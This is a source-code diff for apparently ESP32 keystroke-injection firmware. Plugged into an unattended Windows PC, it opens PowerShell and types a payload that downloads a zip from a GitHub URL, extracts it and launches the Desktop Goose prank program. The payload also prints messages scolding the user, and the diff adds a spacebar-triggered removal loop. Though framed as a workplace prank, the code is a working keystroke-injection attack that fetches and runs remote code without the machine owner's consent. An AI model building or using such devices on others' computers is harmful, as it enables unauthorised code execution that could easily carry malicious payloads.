@@ -198,7 +198,7 @@ void sendKeystrokes(const char *text)
     {
       Keyboard.print(*text);
     }
-    delay(2); // Small delay to ensure keystrokes register
+    delay(1); // Small delay to ensure keystrokes register
     text++;
   }
   if (usbReady)
@@ -222,26 +222,34 @@ void openPowerShell()
   // Type 'powershell' and press Enter
   sendKeystrokes("powershell");
   Keyboard.write(KEY_RETURN);
-  delay(2000);
+  delay(1200);
 }
 
 void executePayload()
 {
   const char *payload = 
-    "$zipPath=[System.IO.Path]::GetTempPath() + 'DesktopGoose.zip';"
-    "$extractRoot=[System.IO.Path]::GetTempPath() + 'DesktopGooseExtract';"
-    "$finalExtractPath=[System.IO.Path]::GetTempPath() + 'DesktopGoose';"
+    "$zipPath='.\\DesktopGoose.zip';"
+    "$extractPath='.\\DesktopGoose';"
     "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/OwendB1/DesktopGooseDownload/production/DesktopGoose.zip' -OutFile $zipPath;"
-    "Expand-Archive -Path $zipPath -DestinationPath $extractRoot -Force;"
-    "$desktopGooseFolder=Get-ChildItem -Path $extractRoot -Recurse -Directory -Filter 'Desktop Goose v0.31' | Select-Object -First 1 -ExpandProperty FullName;"
-    "if ($desktopGooseFolder) { Move-Item -Path $desktopGooseFolder -Destination $finalExtractPath -Force };"
-    "$exePath=$finalExtractPath + '\\DesktopGoose.exe';"
-    "if (Test-Path $exePath) { Start-Process -FilePath $exePath };"
-    "Write-Host \"\";"
-    "Write-Host \"You left your PC open at work! That is not super smart....\";"
+    "Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force;"
+    "if (Test-Path \"$extractPath\\GooseDesktop.exe\") { Start-Process -FilePath \"$extractPath\\GooseDesktop.exe\" };"
+    "Write-Host \"You left your PC unattended at work! That is not super smart....\";"
     "Write-Host \"You've gotten goosed for that reason.\";"
-    "Write-Host \"You can just kill the goose using Task Manager and remove the files from your AppData folder.\";"
-    "Write-Host \"Please return the ESP32 to Owen de Bree :)\";";
+    "Write-Host \"Simply press Spacebar to remove it now...\";"
+    "while ($true) {"
+        "if ([console]::KeyAvailable) {"
+            "$key = [console]::ReadKey($true).Key;"
+            "if ($key -eq 'Spacebar') {"
+                "if (Test-Path \"$extractPath\\Close Goose.bat\") {"
+                    "Start-Process -FilePath \"$extractPath\\Close Goose.bat\" -Wait;"
+                "};"
+                "Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue;"
+                "Write-Host \"DesktopGoose has been removed!\";"
+                "exit;"
+            "}"
+        "}"
+    "}";
+
 
   sendKeystrokes(payload);
   delay(10);
